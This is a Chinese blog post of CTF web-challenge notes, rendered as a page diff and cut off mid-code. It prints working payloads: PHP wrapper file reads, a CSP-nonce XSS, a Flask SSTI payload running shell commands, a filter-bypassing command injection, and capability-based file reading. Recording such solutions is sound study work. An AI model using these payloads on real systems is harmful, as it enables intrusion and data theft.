@@ -1,0 +1,761 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/stamp0234_128x128.ico">
+  <link rel="icon" href="/img/stamp0234_128x128.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#ddaacc">
+  <meta name="author" content="huarun">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2601做题笔记 一月份找了点web题做。其中大部分都来自 NSSCTF 的每日一题。 还没搞清楚的问题  01 没搞懂discord咋玩 13 图片隐写。在图片中实现一个二维图灵机？ IDA反编译后的代码啃不下来。 21 c_rehash 这个脚本，以及 CVE-2022-1292 （OpenSSL RCE 漏洞）  01 [SDCTF 2022]HuMongous Mistake 尝试用 ad">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2601做题笔记">
+<meta property="og:url" content="https://blog.huarun.moe/2026/02/02/2601%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="huarun&#39;s Blog">
+<meta property="og:description" content="2601做题笔记 一月份找了点web题做。其中大部分都来自 NSSCTF 的每日一题。 还没搞清楚的问题  01 没搞懂discord咋玩 13 图片隐写。在图片中实现一个二维图灵机？ IDA反编译后的代码啃不下来。 21 c_rehash 这个脚本，以及 CVE-2022-1292 （OpenSSL RCE 漏洞）  01 [SDCTF 2022]HuMongous Mistake 尝试用 ad">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.huarun.moe/img/posts/003daily2601/260106_1.png">
+<meta property="og:image" content="https://blog.huarun.moe/img/posts/003daily2601/260121_1.png">
+<meta property="og:image" content="https://blog.huarun.moe/img/posts/003daily2601/260121_2.png">
+<meta property="og:image" content="https://blog.huarun.moe/img/posts/003daily2601/260121_4.png">
+<meta property="article:published_time" content="2026-02-02T12:35:28.000Z">
+<meta property="article:modified_time" content="2026-02-02T12:41:37.923Z">
+<meta property="article:author" content="huarun">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huarun.moe/img/posts/003daily2601/260106_1.png">
+  
+  
+  
+  <title>2601做题笔记 - huarun&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.huarun.moe","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>huarun&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2601做题笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-02 20:35" pubdate>
+          2026年2月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2601做题笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="2601做题笔记">2601做题笔记</h2>
+<p>一月份找了点web题做。其中大部分都来自 NSSCTF 的每日一题。</p>
+<h2 id="还没搞清楚的问题">还没搞清楚的问题</h2>
+<ul>
+<li>01 没搞懂discord咋玩</li>
+<li>13 图片隐写。在图片中实现一个二维图灵机？ IDA反编译后的代码啃不下来。</li>
+<li>21 <code>c_rehash</code> 这个脚本，以及 <strong>CVE-2022-1292</strong> （OpenSSL RCE 漏洞）</li>
+</ul>
+<h2 id="01-SDCTF-2022-HuMongous-Mistake">01 [SDCTF 2022]HuMongous Mistake</h2>
+<p>尝试用 admin 创建账户，发现用户已存在。</p>
+<p>做这道题之前甚至需要加入一个 discord 群组。我的是：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NSSCTF</span>-SDCTF-<span class="hljs-number">2022</span>#<span class="hljs-number">7551</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/acmucsd/sdctf-2022/tree/main/web/medium%20-%20humongous%20mistake#original-specification">sdctf-2022/web/medium - humongous mistake at main · acmucsd/sdctf-2022</a></p>
+<p>感觉这道题过时了？看官方wp好像是利用 discord 的 <strong>Two-Factor Authentication</strong> 不会进行用户检测的漏洞。但是现在 Discord 已经升级成 <strong>Multi-Factor Authentication</strong> 了，不知道还管不管用。</p>
+<h2 id="02-SWPUCTF-2021-新生赛-PseudoProtocols">02 [SWPUCTF 2021 新生赛] PseudoProtocols</h2>
+<h3 id="Task-1">Task 1</h3>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">hint is hear Can you find out the hint.php?<br></code></pre></td></tr></table></figure>
+<p>php伪协议，使用base64编码回显文件内容：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?wllm=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=hint.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
+<p>解码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//go to /test2222222222222.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="Task-2">Task 2</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>, <span class="hljs-string">&quot;180&quot;</span>);  <br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);  <br><span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];  <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>)) === <span class="hljs-string">&#x27;I want flag&#x27;</span>)&#123;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success\n&quot;</span>;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>payload：</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.data.php">PHP: data:// - Manual</a></p>
+<p>数据流封装器。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node7.anna.nssctf.cn:<span class="hljs-number">29990</span><span class="hljs-regexp">/test2222222222222.php?a=data:/</span><span class="hljs-regexp">/text/</span>plain,I want flag<br></code></pre></td></tr></table></figure>
+<h2 id="03-NSSRound-12-Basic-ability">03 [NSSRound#12 Basic]ability</h2>
+<p>使用 SSH 连接到服务器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -l ctf -p 25545 node4.anna.nssctf.cn<br></code></pre></td></tr></table></figure>
+<p>使用 <code>getcap</code> (get capabilities) <strong>递归查找</strong> (<code>-r</code>, recursive) 出在<strong>根目录</strong> <code>/</code> 下的文件的能力(capabilities) ，并将错误信息 (<code>2</code>) 放入 <code>/dev/null</code> 中（可以理解为忽略报错）。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">getcap -r / 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<p>查找到 <code>/usr/bin/</code> 目录下的 <code>dig</code> 文件拥有 cap_dac_override 权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/usr/bin/dig cap_dac_override=ep<br></code></pre></td></tr></table></figure>
+<p><strong>DAC (Discretionary Access Control)</strong> 自主访问控制，该功能会对文件的 <code>rwx</code> 等权限和文件的所有者进行检查。</p>
+<p>该文件能够绕过 DAC，非常的逆天！也印证了题目里那句话：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">能力越大，越危险<br></code></pre></td></tr></table></figure>
+<p>总之，现在可以利用这个超高权限的文件来读取flag了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dig -f flag<br></code></pre></td></tr></table></figure>
+<h3 id="Everything-is-a-file-in-Linux">Everything is a file in Linux</h3>
+<p>在 <code>usr/bin/</code> 目录下的文件，包含了 Linux 的许多常用命令。其实，在 Shell 输入的每个命令都是一个<strong>二进制可执行文件</strong>。</p>
+<p><code>dig</code> : <strong>Domain Information Groper</strong> ，向 DNS 服务器查询指定的信息。</p>
+<p>虽然 <code>flag</code> 文件中的内容不是域名，但可以通过 dig 的报错回显 <code>flag</code> 的内容。</p>
+<h2 id="04-AFCTF-2021-BABY-CSP">04 [AFCTF 2021]BABY_CSP</h2>
+<p>URL 中可以传入 <code>school</code> 参数，传入 XSS，console 会报错</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://node4.anna.nssctf.cn:22548/?school=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Executing <span class="hljs-keyword">inline</span> script violates the <span class="hljs-keyword">following</span> Content <span class="hljs-keyword">Security</span> <span class="hljs-keyword">Policy</span> directive <span class="hljs-string">&#x27;script-src &#x27;</span>nonce<span class="hljs-number">-29</span>de6fde0db5686d<span class="hljs-string">&#x27;&#x27;</span>. Either the <span class="hljs-string">&#x27;unsafe-inline&#x27;</span> keyword, a hash (<span class="hljs-string">&#x27;sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=&#x27;</span>), <span class="hljs-keyword">or</span> a nonce (<span class="hljs-string">&#x27;nonce-...&#x27;</span>) <span class="hljs-keyword">is</span> required <span class="hljs-keyword">to</span> <span class="hljs-keyword">enable</span> <span class="hljs-keyword">inline</span> execution. The action has been blocked.<br></code></pre></td></tr></table></figure>
+<p>注意到有 nonce (Number used once)。多次刷新页面，发现这个 nonce 是静态的，传参时硬编码即可。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">29de6fde0db5686d</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>成功弹出 alert。改成 <code>alert(flag)</code> 即可。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://node4.anna.nssctf.cn:22548/?school=<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">29de6fde0db5686d</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这题真是够 baby 的。。。唯一的难点可能就是 <code>alert(flag)</code> 要稍微猜一下。。。</p>
+<h2 id="06-CISCN-2019华东南-Double-Secret">06 [CISCN 2019华东南]Double Secret</h2>
+<blockquote>
+<p>这题 NSSCTF 的环境有问题，可以到 BUUCTF 上做同样的题目：<br>
+<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret">BUUCTF在线评测</a></p>
+</blockquote>
+<p>用 dirsearch 扫描目录，发现有 <code>robots.txt</code> 和 <code>/secret</code> 可访问。</p>
+<p><code>robots.txt</code> 中有提示：</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">It <span class="hljs-keyword">is</span> Android ctf<br></code></pre></td></tr></table></figure>
+<p>/secret 目录下写着：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">Tell me your secret.I will encrypt it so <span class="hljs-keyword">others</span> can<span class="hljs-symbol">&#x27;t</span> see<br></code></pre></td></tr></table></figure>
+<p>传入参数 <code>secret</code>为一个很大的整数，会报错，发现用了 Flask，并且有代码可以展开。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node4.anna.nssctf.cn:<span class="hljs-number">21932</span>/secret?secret=<span class="hljs-number">129000000000000000</span><br></code></pre></td></tr></table></figure>
+<img src="/img/posts/003daily2601/260106_1.png" srcset="/img/loading.gif" lazyload>
+<p>发现使用了 RC4 加密算法，且秘钥为 <code>HereIsTreasure</code></p>
+<p>在 CyberChef 中进行 RC4 加密，Passphrase 设定为 <code>HereIsTreasure</code>，然后尝试 SSTI</p>
+<blockquote>
+<p>因为这道题目标签中有 SSTI，而且前面发现用了 Flask，故猜测是模板注入。<br>
+但在实战中没有这么明显的提示，只能靠经验和<strong>脑洞</strong>去猜了。</p>
+<p>记得勤复习哦 <a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/">SSTI 注入 - Hello CTF</a></p>
+</blockquote>
+<p>payload（RC4 加密 + URL 编码即可）</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">self.__init__.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat /f*&#x27;</span>).read() &#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="07-GKCTF-2021-CheckBot">07 [GKCTF 2021]CheckBot</h2>
+<p>页面源代码中有提示：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">I am a check admin bot, I will check your URL file suffix!</span><br><span class="hljs-comment">------------------------------------------------------------</span><br><span class="hljs-comment">POST url for bot!</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure>
+<p>访问 <code>admin.php</code> 得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">no!you are 58.248.162.154<br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/web/csrf/">CSRF - CTF Wiki</a></p>
+<p>这个题涉及的知识盲区有点多了，先放放。参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://kinseyy.github.io/2024/11/12/GKCTF-2021-CheckBot/">[GKCTF 2021]CheckBot | 北歌</a><br>
+<a target="_blank" rel="noopener" href="https://boogipop.com/2023/07/02/BUUCTF%20Web%20WriteUp%207/#GKCTF-2021-CheckBot">BUUCTF Web Writeup 7 - Boogiepop Doesn’t Laugh</a></p>
+<p>相关搜索：</p>
+<p>VPS frp内网穿透 反弹shell web服务 xss python的http.server nc reqbin</p>
+<p>再看看 ADCTF2024 web 也有一道相关题目</p>
+<h2 id="08-第五空间-2021-WebFTP">08 [第五空间 2021]WebFTP</h2>
+<p>dirsearch一下，发现一堆泄露。进入<code>/README.md</code> ，发现有初始账号</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">超级管理员 <span class="hljs-literal">admin</span> 密码 admin888<br></code></pre></td></tr></table></figure>
+<p>2011年的web应用居然这么没有安全意识吗。。。</p>
+<p>这个题也是够sb，flag直接放在phpinfo.php里面（环境变量）。</p>
+<h2 id="12-WUSTCTF-2020-朴实无华">12 [WUSTCTF 2020]朴实无华</h2>
+<p>做任何 Web 题都要先流量分析，养成好习惯。</p>
+<p>多一点耐心，慢慢看每一个请求头和请求体；这道题找半天也没找到 <code>/fAke_f1agggg.php</code> 的提示，看了wp才知道藏在headers中。</p>
+<h3 id="level1-PHP-的字符串类型转换特性">level1 - PHP 的字符串类型转换特性</h3>
+<p><code>intval()</code> - Get the integer value of a variable<br>
+该函数在处理字符串时：从左到右处理读取，直到遇到第一个非数字字符。</p>
+<p>然而，在字符串和整数的算术运算中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$string</span> = <span class="hljs-string">&quot;3e3&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$string</span> + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure>
+<p>最终输出 <code>$a</code> 为 3001。说明php可以识别字符串中的科学计数法</p>
+<h3 id="level2-hash-之后和原来一样？">level2 - hash 之后和原来一样？</h3>
+<p>要满足：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br></code></pre></td></tr></table></figure>
+<p>存在：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0e215962017</span><br></code></pre></td></tr></table></figure>
+<p>它的 md5 值是：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>e291242476940776845<span class="hljs-number">150308577824</span><br></code></pre></td></tr></table></figure>
+<p>足以绕过 PHP 的弱比较。</p>
+<h3 id="getflag">getflag</h3>
+<p><code>strstr()</code> : Find the first occurrence of a string.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>过滤了 cat 、空格 和 wctf2020. 空格用 <code>${IFS}</code> 绕过即可。既然用不了cat，我们可以用tac，反过来输出文件内容啊。</p>
+<p>最终payload：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node5.anna.nssctf.cn:<span class="hljs-number">28758</span>/fl4g.php?num=<span class="hljs-number">3</span>e3&amp;md5=<span class="hljs-number">0</span>e215962017&amp;get_flag=tac<span class="hljs-variable">$&#123;IFS&#125;</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br></code></pre></td></tr></table></figure>
+<h2 id="13-GoogleCTF-2017-final-Picasso">13 [GoogleCTF 2017 final]Picasso</h2>
+<p>确实是 Final 该有的难度。</p>
+<p>首先用 IDA 反编译，可以得到 main() 函数的内容</p>
+<p>我操了，怎么这么难啊。网上一篇wp都找不到。</p>
+<h2 id="19-suctf-2019-easyweb">19 [suctf 2019]easyweb</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);  </span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;        <span class="hljs-variable">$tmp_name </span>= <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];        <span class="hljs-variable">$name </span>= <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];        <span class="hljs-variable">$extension </span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span 